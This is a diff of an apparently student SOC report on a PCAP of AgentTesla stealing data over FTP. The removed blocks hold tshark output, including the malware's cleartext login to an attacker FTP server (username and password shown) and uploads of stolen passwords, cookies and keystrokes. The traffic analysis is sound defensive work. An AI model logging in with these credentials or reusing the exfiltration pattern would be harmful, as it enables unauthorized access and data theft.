@@ -35,27 +35,6 @@ The PCAP capture spans 182 frames (53,464 bytes). FTP dominates — 42 control f
 ![Protocol Hierarchy Overview](screenshots/Protocol Hierarchy Overview.jpg)
 > Source: `screenshots/Protocol Hierarchy Overview`
 
-```
-─(paul㉿kali)-[~/SOC/Capstone Project/AgentTesla]
-└─$ tshark -r 2024-12-04-AgentTesla-variant-using-FTP.pcap -q -z io,phs
-
-===============================================================
-Protocol Hierarchy Statistics
-Filter:
-
-frame                                    frames:182 bytes:53464
-  eth                                     frames:182 bytes:53464
-    ip                                    frames:182 bytes:53464
-      udp                                 frames:6 bytes:574
-        dns                               frames:6 bytes:574
-      tcp                                 frames:176 bytes:52890
-        tls                               frames:7 bytes:4277
-          tls                             frames:1 bytes:1317
-        ftp                               frames:42 bytes:4354
-        ftp-data                          frames:27 bytes:38747
-          data-text-lines                 frames:3 bytes:3448
-===============================================================
-```
 
 ### IP Conversation Analysis
 
@@ -67,22 +46,9 @@ frame                                    frames:182 bytes:53464
 | 172.67.74.152 | api.ipify.org (Cloudflare) | 19 | Victim public IP lookup — HTTPS; first contact post-execution |
 
 **[Screenshot: IP Conversation Results]**
-![IP Conversation Results](<screenshots/Identify All Hosts (IP Conversation Table).jpg>)
+![IP Conversation Results](screenshots/Identify%20All%20Hosts%20%28IP%20Conversation%20Table%29.jpg)
 > Source: `screenshots/Identify All Hosts (IP Conversation Table)`
 
-```
-─(paul㉿kali)-[~/SOC/Capstone Project/AgentTesla]
-└─$ tshark -r 2024-12-04-AgentTesla-variant-using-FTP.pcap -q -z conv,ip
-===============================================================
-IPv4 Conversations
-Filter:<No Filter>
-                                    |       <-        |       ->        |     Total     | Relative | Duration  |
-                                    | Frames Bytes |    | Frames Bytes |    | Frames Bytes |  Start   |           |
-10.12.4.101 <-> 192.254.225.136     |  82  6,065 bytes | 75  41 kB       | 157  47 kB     | 6.317201000 | 1206.1689 |
-10.12.4.101 <-> 172.67.74.152       |  10  3,997 bytes |  9  944 bytes   |  19  4,941 bytes | 0.049197000 | 100.3895 |
-10.12.4.101 <-> 10.12.4.1           |   3  341 bytes   |  3  233 bytes   |   6  574 bytes | 0.000000000 | 1211.3690 |
-===============================================================
-```
 
 ### Confirmed Victim Profile
 
@@ -124,13 +90,6 @@ Filter:<No Filter>
 ![DNS Query Extraction](screenshots/Extract DNS Queries.jpg)
 > Source: `screenshots/Extract DNS Queries`
 
-```
-─(paul㉿kali)-[~/SOC/Capstone Project/AgentTesla]
-└─$ tshark -r 2024-12-04-AgentTesla-variant-using-FTP.pcap -T fields -e frame.time_relative -e ip.src -e dns.qry.name -Y "dns.flags.response == 0"
-0.000000000    10.12.4.101    api.ipify.org
-6.122416000    10.12.4.101    ftp.ercolina-usa.com
-1211.312537000 10.12.4.101    ftp.ercolina-usa.com
-```
 
 ### DNS Response Analysis: Resolved IPs
 
@@ -140,19 +99,9 @@ Filter:<No Filter>
 | **ftp.ercolina-usa.com** | **192.254.225.136** | **Attacker-controlled FTP server — receives all stolen data** |
 
 **[Screenshot: DNS Response Extraction]**
-![DNS Response Extraction](<screenshots/Extract DNS Responses (Domain → IP Resolution).jpg>)
+![DNS Response Extraction](screenshots/Extract%20DNS%20Responses%20%28Domain%20%E2%86%92%20IP%20Resolution%29.jpg)
 > Source: `screenshots/Extract DNS Responses (Domain → IP Resolution)`
 
-```
-─(paul㉿kali)-[~/SOC/Capstone Project/AgentTesla]
-└─$ tshark -r 2024-12-04-AgentTesla-variant-using-FTP.pcap \
-  -Y "dns.flags.response == 1" \
-  -T fields -e frame.time_relative -e dns.qry.name -e dns.a
-
-0.039953000    api.ipify.org         172.67.74.152,104.26.12.205,104.26.13.205
-6.315643000    ftp.ercolina-usa.com  192.254.225.136
-1211.368976000 ftp.ercolina-usa.com  192.254.225.136
-```
 
 ### DNS Analyst Summary
 
@@ -207,35 +156,6 @@ FTP runs entirely in cleartext. The following control channel exchange was recon
 ![Reconstruct Full FTP Session 1](screenshots/Reconstruct Full FTP Session 1.jpg)
 > Source: `screenshots/Reconstruct Full FTP Session 1`
 
-```
-─(paul㉿kali)-[~/SOC/Capstone Project/AgentTesla]
-└─$ tshark -r 2024-12-04-AgentTesla-variant-using-FTP.pcap -Y "ftp" -T fields -e frame.time_relative -e ip.src -e ip.dst -e ftp.request.command -e ftp.request.arg -e ftp.response.code -e ftp.response.arg
-
-6.4786180 192.254.225.136 10.12.4.101                              220  --------- Welcome to Pure-FTPd [privsep] [TLS] ---------
-6.4809410 10.12.4.101     192.254.225.136 USER ben@ercolina-usa.com
-6.5502010 192.254.225.136 10.12.4.101                              331  User ben@ercolina-usa.com OK. Password required
-6.5501010 10.12.4.101     192.254.225.136 PASS nXe0M-WA6WGnJ
-6.7501300 192.254.225.136 10.12.4.101                              230  OK. Current restricted directory is /
-6.8352180 10.12.4.101     192.254.225.136 OPTS               utf8 on
-6.8352180 192.254.225.136 10.12.4.101                              504  Unknown command
-6.9124600 10.12.4.101     192.254.225.136 PWD
-6.9124600 192.254.225.136 10.12.4.101                              257  "/" is your current location
-6.9885030 10.12.4.101     192.254.225.136 TYPE               I
-6.9885030 192.254.225.136 10.12.4.101                              200  TYPE is now 8-bit binary
-6.9895030 10.12.4.101     192.254.225.136 PASV
-6.9895030 192.254.225.136 10.12.4.101                              227  Entering Passive Mode (192,254,225,136,181,153)
-7.1581940 10.12.4.101     192.254.225.136 STOR               PW_gary.strickman-DESKTOP-VJCRXEB_2024_12_04_21_20_57.html
-7.3237450 192.254.225.136 10.12.4.101                              226  File successfully transferred
-8.1029400 10.12.4.101     192.254.225.136 PASV
-8.1029400 192.254.225.136 10.12.4.101                              227  Entering Passive Mode (192,254,225,136,181,147)
-8.1806790 10.12.4.101     192.254.225.136 STOR               CO_Chrome_Default.txt_gary.strickman-DESKTOP-VJCRXEB_2024_12_04_21_21_03.txt
-8.2712570 192.254.225.136 10.12.4.101                              226  File successfully transferred
-8.4524970 10.12.4.101     192.254.225.136 PASV
-8.4524970 192.254.225.136 10.12.4.101                              227  Entering Passive Mode (192,254,225,136,175,147)
-8.5301990 10.12.4.101     192.254.225.136 STOR               CO_Edge Chromium_Default.txt_gary.strickman-DESKTOP-VJCRXEB_2024_12_04_21_21_04.txt
-8.6197210 192.254.225.136 10.12.4.101                              150  Accepted data connection
-8.6993750 192.254.225.136 10.12.4.101                              226  File successfully transferred
-```
 
 ### Session 2 — Keylog Upload (T+1,211s — ~20 min later)
 
@@ -257,26 +177,6 @@ Twenty minutes after Session 1, AgentTesla opened a second FTP session to upload
 
 ![Reconstruct Full FTP Sessions full session](screenshots/Reconstruct Full FTP Sessions full session.jpg)
 
-```
-8.6993750  192.254.225.136 10.12.4.101     150  Accepted data connection
-8.8248640  192.254.225.136 10.12.4.101     226  File successfully transferred
-1211.548976000 192.254.225.136 10.12.4.101 220  --------- Welcome to Pure-FTPd [privsep] [TLS] ---------
-1211.549252000 10.12.4.101     192.254.225.136 USER ben@ercolina-usa.com
-1211.634550000 10.12.4.101     192.254.225.136 PASS nXe0M-WA6WGnJ
-1211.813053000 192.254.225.136 10.12.4.101     230  OK. Current restricted directory is /
-1211.814074000 10.12.4.101     192.254.225.136 OPTS               utf8 on
-1211.889399000 192.254.225.136 10.12.4.101     504  Unknown command
-1211.968465000 10.12.4.101     192.254.225.136 PWD
-1211.968912000 192.254.225.136 10.12.4.101     257  "/" is your current location
-1212.054431000 10.12.4.101     192.254.225.136 TYPE               I
-1212.054431000 192.254.225.136 10.12.4.101     200  TYPE is now 8-bit binary
-1212.147777000 10.12.4.101     192.254.225.136 PASV
-1212.147777000 192.254.225.136 10.12.4.101     227  Entering Passive Mode (192,254,225,136,189,80)
-1212.249450000 10.12.4.101     192.254.225.136 STOR               KL_gary.strickman-DESKTOP-VJCRXEB_2024_12_04_21_41_04.html
-1212.328391000 192.254.225.136 10.12.4.101     150  Accepted data connection
-1212.425168000 192.254.225.136 10.12.4.101     226  File successfully transferred
-```
-
 ### Exfiltrated Files: All 4 Recovered from PCAP
 
 | Module | Filename | Size | Content |
@@ -293,22 +193,6 @@ Twenty minutes after Session 1, AgentTesla opened a second FTP session to upload
 > Also relevant: `screenshots/exfiltrated files from PCAP`
 
 ![Exfiltrated files from PCAP](screenshots/exfiltrated files from PCAP.jpg)
-
-```
-─(paul㉿kali)-[~/SOC/Capstone Project/AgentTesla/ftp_exports]
-└─$ ls
-CO_Chrome_Default.txt_gary.strickman-DESKTOP-VJCRXEB_2024_12_04_21_21_03.txt
-'CO_Edge Chromium_Default.txt_gary.strickman-DESKTOP-VJCRXEB_2024_12_04_21_21_04.txt'
-KL_gary.strickman-DESKTOP-VJCRXEB_2024_12_04_21_41_04.html
-PW_gary.strickman-DESKTOP-VJCRXEB_2024_12_04_21_20_57.html
-
-└─$ ls -lh
-total 44K
--rw-r--r-- 1 paul paul  24K May 29 11:23 CO_Chrome_Default.txt_gary.strickman-DESKTOP-VJCRXEB_2024_12_04_21_21_03.txt
--rw-r--r-- 1 paul paul  12K May 29 11:23 'CO_Edge Chromium_Default.txt_gary.strickman-DESKTOP-VJCRXEB_2024_12_04_21_21_04.txt'
--rw-r--r-- 1 paul paul 1.5K May 29 11:23 KL_gary.strickman-DESKTOP-VJCRXEB_2024_12_04_21_41_04.html
--rw-r--r-- 1 paul paul  392 May 29 11:23 PW_gary.strickman-DESKTOP-VJCRXEB_2024_12_04_21_20_57.html
-```
 
 ### AgentTesla Filename Convention — Decoded
 
